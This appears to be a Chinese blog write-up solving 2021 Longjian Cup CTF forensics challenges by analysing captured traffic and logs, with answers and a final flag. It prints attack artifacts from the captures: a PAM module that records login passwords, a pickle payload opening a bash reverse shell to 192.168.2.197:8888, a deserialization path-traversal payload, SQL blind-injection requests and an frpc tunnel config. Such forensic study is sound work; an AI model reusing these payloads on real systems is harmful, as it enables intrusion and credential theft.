---
title: 2021陇剑杯
slug: 2021-longjian-cup-zysabr
url: /post/2021-longjian-cup-zysabr.html
date: '2024-08-23 21:58:21+08:00'
lastmod: '2025-11-14 12:21:41+08:00'
description: 流量分析练习
toc: true
isCJKLanguage: true
---



# 2021陇剑杯

# 签到

## 问一

### 题目描述

此时正在进行的可能是\_\_协议的网络攻击。（如有字母请全部使用小写，填写样例：http、dns、ftp）。

此时正在进行的可能是\_\_协议的网络攻击。（如有字母请全部使用小写，填写样例：http、dns、ftp）。

### 题解

先对流量包进行协议统计

![1713958180570-39bb3644-7b61-45fd-a07e-73b94e117aca](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picnet-img-1713958180570-39bb3644-7b61-45fd-a07e-73b94e117aca-20240823215848-g76aynn.png)

发现主要就是存在tcp协议和http协议

tcp协议是传输层，http是应用层，因此可以判断就是http协议进行的攻

```plain
http
```

# JWT

## 问一

### 题目描述

昨天，单位流量系统捕获了黑客攻击流量，请您分析流量后进行回答：

该网站使用了\_\_认证方式。（如有字母请全部使用小写）。

### 题解

追踪http协议的流，翻找一下发现存在token，特征很明显是JWT，再配合上题目描述

![1713958208916-cf60cc27-18ce-42a3-b8a2-b1da37b1d010](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picnet-img-1713958208916-cf60cc27-18ce-42a3-b8a2-b1da37b1d010-20240823215848-o57ca69.png)

可以确定答案是

```plain
jwt
```

## 问二

### 题目描述

昨天，单位流量系统捕获了黑客攻击流量，请您分析流量后进行回答：

黑客绕过验证使用的jwt中，id和username是\_\_。（中间使用#号隔开，例如1#admin）。

### 题解

[JSON Web Tokens - jwt.io](https://jwt.io/)

将jwt进行解析，得到

![1713958230763-60743f6f-43b4-4b5a-8b8d-ae9173b82e3f](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picnet-img-1713958230763-60743f6f-43b4-4b5a-8b8d-ae9173b82e3f-20240823215849-eley2q9.png)

```plain
10087#admin
```

## 问三

### 题目描述

昨天，单位流量系统捕获了黑客攻击流量，请您分析流量后进行回答：  
黑客获取webshell之后，权限是\_\_？。

### 题解

追踪tcp流里，挨个查看

![1713958246909-2c95fc74-8352-4e6c-8270-10b718d9cfba](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picnet-img-1713958246909-2c95fc74-8352-4e6c-8270-10b718d9cfba-20240823215849-cout809.png)

在流10中发现有命令whoami

回显为`alert("root\n")`​

答案即为

```plain
root
```

## 问四

### 题目描述

昨天，单位流量系统捕获了黑客攻击流量，请您分析流量后进行回答：  
黑客上传的恶意文件文件名是\_。(请提交带有文件后缀的文件名，例如x.txt)。

### 题解

在流13中发现存在向tmp目录中写入一个1.c的文件

![1713958348296-baeb39c2-f643-4077-a867-6a33133068cd](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picnet-img-1713958348296-baeb39c2-f643-4077-a867-6a33133068cd-20240823215849-t02rgx0.png)

解码看一下

```c
#include <stdio.h>
#include <stdlib.h>
#include <curl/curl.h>
#include <string.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <unistd.h>
size_t write_data(void *buffer, size_t size, size_t nmemb, void *userp)
{
return size * nmemb;
}

void saveMessage(char (*message)[]) {
FILE *fp = NULL;
fp = fopen("/tmp/.looter", "a+");
fputs(*message, fp);
fclose(fp);
}

PAM_EXTERN int pam_sm_setcred( pam_handle_t *pamh, int flags, int argc, const char **argv ) {
return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, const char **argv ) {
int retval;
const char* username;
const char* password;
char message[1024];
retval = pam_get_user(pamh, &username, "Username: ");
pam_get_item(pamh, PAM_AUTHTOK, (void *) &password);
if (retval != PAM_SUCCESS) {
return retval;
}

snprintf(message,2048,"Username %s\nPassword: %s\n",username,password);
saveMessage(&message);
return PAM_SUCCESS;
}
```

并且发现后续黑客又再次查看了该文件，并对其进行了编译链接等操作，最终并再次查看了自身是否为root权限。

因此，可以确定答案确实为

```plain
1.c
```

## 问五

### 题目描述

昨天，单位流量系统捕获了黑客攻击流量，请您分析流量后进行回答：  
黑客在服务器上编译的恶意so文件，文件名是\_。

### 题解

在上一题查看后，就已经发现1.c文件有过改动

![1713958373499-100fdb4c-0437-4f8d-ab1b-be33967d05ee](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picnet-img-1713958373499-100fdb4c-0437-4f8d-ab1b-be33967d05ee-20240823215849-mvn7mfc.png)

并在编译将其复制到了系统文件夹下

![1713958393272-fc8836ba-9644-4618-be69-229ab4581427](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picnet-img-1713958393272-fc8836ba-9644-4618-be69-229ab4581427-20240823215850-1aqpa24.png)

```plain
looter.so
```

## 问六

### 题目描述

昨天，单位流量系统捕获了黑客攻击流量，请您分析流量后进行回答：  
黑客在服务器上修改了一个配置文件，文件的绝对路径为\_。（请确认绝对路径后再提交）。

### 题解

将刚刚的恶意so文件又输入到一个文件夹下，并重新查看确认，可以判断确实为

![1713958400232-bd74c201-0f17-4b62-910c-738a1308cb48](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picnet-img-1713958400232-bd74c201-0f17-4b62-910c-738a1308cb48-20240823215850-a84c35x.png)

```plain
/etc/pam.d/common-auth
```

# webshell

## 问一

### 题目描述

单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：  
黑客登录系统使用的密码是\_。

### 题解

询问密码是多少，直接尝试搜索字符串pass，发现账户密码直接明文传输的

![1713958416577-62a2ec19-dda0-48df-af68-61b0d4cb4ab5](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picnet-img-1713958416577-62a2ec19-dda0-48df-af68-61b0d4cb4ab5-20240823215850-7bzvg31.png)

```plain
Admin123!@#
```

## 问二

### 题目描述

黑客修改了一个日志文件，文件的绝对路径为\_\_  
答题格式：\\xx\\xxx\\xxx\\xxx.log  
不区分大小写

### 题解

通过搜索log的关键词，发现一个位置日志地址，并且进行了基本的枚举和木马写入操作

![1713958433248-493c0760-6753-4cb5-8372-84a52e271f9f](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picnet-img-1713958433248-493c0760-6753-4cb5-8372-84a52e271f9f-20240823215850-d9vcoht.png)

![1713958448314-f7b89cc1-5252-4922-86b3-4a9411a52484](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picnet-img-1713958448314-f7b89cc1-5252-4922-86b3-4a9411a52484-20240823215850-thsc61c.png)

```plain
data/Runtime/Logs/Home/21_08_07.log
```

还不对，需要补全

```plain
/var/www/html/data/Runtime/Logs/Home/21_08_07.log
```

## 问三

### 题目描述

单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：  
黑客获取webshell之后，权限是\_\_？

### 题解

在刚刚的日志文件左右，发现了几个命令执行的动向，但是唯一成功，有200的仅有流312

![1713958462271-7b6e66d3-0791-4a60-9112-bffcf09a7b30](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picnet-img-1713958462271-7b6e66d3-0791-4a60-9112-bffcf09a7b30-20240823215851-4fv6r8z.png)

在user/group这里发现现在的用户权限为

```plain
www-data
```

## 问四

### 题目描述

单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：  
黑客写入的webshell文件名是\_。

### 题解

将流量包继续向下翻，发现在流334附近向下几个都在传输一个名为1.php的文件

![1713958475179-1c277bde-3bac-45d1-a4ee-074a166f551d](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picnet-img-1713958475179-1c277bde-3bac-45d1-a4ee-074a166f551d-20240823215851-qryqsgt.png)

追踪tcp流后很明显的看出是一个蚁剑的流量，可以确定木马就是

![1713958483515-04fd0a91-c36f-4cd9-8d98-becd32cd258d](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picnet-img-1713958483515-04fd0a91-c36f-4cd9-8d98-becd32cd258d-20240823215851-oqffdrw.png)

```plain
1.php
```

## 问五

### 题目描述

单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：  
黑客上传的代理工具客户端名字是\_。

### 题解

在流346发现了有frpc.ini，明显的内网穿透工具

![1713958496154-11f8dcc4-d564-44cf-aba6-17e672974d0e](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picnet-img-1713958496154-11f8dcc4-d564-44cf-aba6-17e672974d0e-20240823215851-iyxtuem.png)

```plain
frpc
```

## 问六

### 题目描述

单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：  
黑客代理工具的回连服务端IP是\_。

### 题解

发现一段奇怪的16进制

![1713958515478-82c1b446-0c50-4129-84a0-1f0ad91b2c40](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picnet-img-1713958515478-82c1b446-0c50-4129-84a0-1f0ad91b2c40-20240823215852-w54keod.png)

解码后得到

```plain
[common]
server_addr = 192.168.239.123
server_port = 7778
token=Xa3BJf2l5enmN6Z7A8mv

[test_sock5]
type = tcp
remote_port =8111
plugin = socks5
plugin_user = 0HDFt16cLQJ
plugin_passwd = JTN276Gp
use_encryption = true
use_compression = true
```

因此得到回连地址

```plain
192.168.239.123
```

## 问七

### 题目描述

单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：  
黑客的socks5的连接账号、密码是\_\_。

### 题解

根据解码得到的账号密码为

```plain
0HDFt16cLQJ#JTN276Gp
```

# 日志分析

## 问一

### 题目描述

单位某应用程序被攻击，请分析日志，进行作答：  
网络存在源码泄漏，源码文件名是\_。

### 题解

可以看到明显是在对目录进行信息泄露的爆破

尝试搜索200

```plain
172.17.0.1 - - [07/Aug/2021:01:37:59 +0000] "GET /www%2ezip HTTP/1.1" 200 1686 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
172.17.0.1 - - [07/Aug/2021:01:37:59 +0000] "GET /www%2ezip HTTP/1.1" 200 1686 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
```

可以看出泄露的源码文件为

```plain
www.zip
```

## 问二

### 题目描述

单位某应用程序被攻击，请分析日志，进行作答：  
分析攻击流量，黑客往/tmp目录写入一个文件，文件名为\_。

### 题解

直接搜索tmp

```plain
172.17.0.1 - - [07/Aug/2021:01:38:21 +0000] "GET /?filename=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Ftmp%2Fsess_car&content=func%7CN%3Bfiles%7Ca%3A2%3A%7Bs%3A8%3A%22filename%22%3Bs%3A16%3A%22.%2Ffiles%2Ffilename%22%3Bs%3A20%3A%22call_user_func_array%22%3Bs%3A28%3A%22.%2Ffiles%2Fcall_user_func_array%22%3B%7Dpaths%7Ca%3A1%3A%7Bs%3A5%3A%22%2Fflag%22%3Bs%3A13%3A%22SplFileObject%22%3B%7D HTTP/1.1" 302 879 "-" "python-requests/2.26.0"
172.17.0.1 - - [07/Aug/2021:01:38:21 +0000] "GET /?file=sess_car HTTP/1.1" 200 680 "-" "python-requests/2.26.0"
```

url解码一下

```plain
172.17.0.1 - - [07/Aug/2021:01:38:21  0000] "GET /?filename=../../../../../../../../../../../../../../../../../tmp/sess_car&content=func|N;files|a:2:{s:8:"filename";s:16:"./files/filename";s:20:"call_user_func_array";s:28:"./files/call_user_func_array";}paths|a:1:{s:5:"/flag";s:13:"SplFileObject";} HTTP/1.1" 302 879 "-" "python-requests/2.26.0"
172.17.0.1 - - [07/Aug/2021:01:38:21  0000] "GET /?file=sess_car HTTP/1.1" 200 680 "-" "python-requests/2.26.0"
```

可以看出向tmp文件下写入了

```plain
sess_car
```

## 问三

### 题目描述

单位某应用程序被攻击，请分析日志，进行作答：  
分析攻击流量，黑客使用的是\_\_类读取了秘密文件

### 题解

```plain
{s:8:"filename";s:16:"./files/filename";s:20:"call_user_func_array";s:28:"./files/call_user_func_array";}paths|a:1:{s:5:"/flag";s:13:"SplFileObject";}
```

可以看出其中的类为

```plain
SplFileObject
```

# 简单日志分析

## 问一

### 题目描述

某应用程序被攻击，请分析日志后作答：  
黑客攻击的参数是\_\_。（如有字母请全部使用小写）。

### 题解

刚开始是明显在进行一个扫目录的操作，在找敏感信息泄露

唯一可控的攻击参数只有

```plain
127.0.0.1 - - [07/Aug/2021 10:43:12] "GET /?user=STAKcDAKMFMnY2F0IC9UaDRzX0lTX1ZFUllfSW1wb3J0X0ZpMWUnCnAxCjAoZzAKbHAyCjAoSTAKdHAzCjAoZzMKSTAKZHA0CjBjb3MKc3lzdGVtCnA1CjBnNQooZzEKdFIu HTTP/1.1" 500 -
```

因此答案为

```plain
user
```

## 问二

### 题目描述

某应用程序被攻击，请分析日志后作答：  
黑客查看的秘密文件的绝对路径是\_。

### 题解

先将两个可控参数分别解码得到

```plain
I0
p0
0S'cat /Th4s_IS_VERY_Import_Fi1e'
p1
0(g0
lp2
0(I0
tp3
0(g3
I0
dp4
0cos
system
p5
0g5
(g1
tR.
```

```plain
I0
p0
0S'bash -i >& /dev/tcp/192.168.2.197/8888 0>&1'
p1
0(g0
lp2
0(I0
tp3
0(g3
I0
dp4
0cos
system
p5
0g5
(g1
tR.
```

绝对路径即为

```plain
Th4s_IS_VERY_Import_Fi1e
```

## 问三

### 题目描述

某应用程序被攻击，请分析日志后作答：  
黑客反弹shell的ip和端口是\_。（格式使用“ip:端口"，例如127.0.0.1:2333）。

### 题解

根据上面解码的结果，即得

```plain
192.168.2.197:8888
```

# SQL注入

## 问一

### 题目描述

某应用程序被攻击，请分析日志后作答：  
黑客在注入过程中采用的注入手法叫\_。

### 题解

一眼布尔盲注

```plain
布尔盲注
```

## 问二

### 题目描述

某应用程序被攻击，请分析日志后作答：  
黑客在注入过程中，最终获取flag的数据库名、表名和字段名是\_。（格式为“数据库名#表名#字段名”，例如database#table#column）。

### 题解

```plain
172.17.0.1 - - [01/Sep/2021:01:44:02 +0000] "GET /index.php?id=1%20and%20if(substr((select%20column_name%20from%20information_schema.columns%20where%20table_name='flag'%20and%20table_schema='sqli'),5,1)%20=%20'+',1,(select%20table_name%20from%20information_schema.tables)) HTTP/1.1" 200 506 "-" "python-requests/2.26.0"
172.17.0.1 - - [01/Sep/2021:01:45:55 +0000] "GET /index.php?id=1%20and%20if(substr((select%20flag%20from%20sqli.flag),1,1)%20=%20'%C2%80',1,(select%20table_name%20from%20information_schema.tables)) HTTP/1.1" 200 429 "-" "python-requests/2.26.0"
```

取这两段可以看出

```plain
sqli#flag#flag
```

## 问三

### 题目描述

某应用程序被攻击，请分析日志后作答：  
黑客最后获取到的flag字符串为\_。

### 题解

一个布尔盲注的提取，正则匹配一下即可

```plain
flag{deddcd67-bcfd-487e-b940-1217e668c7db}
```
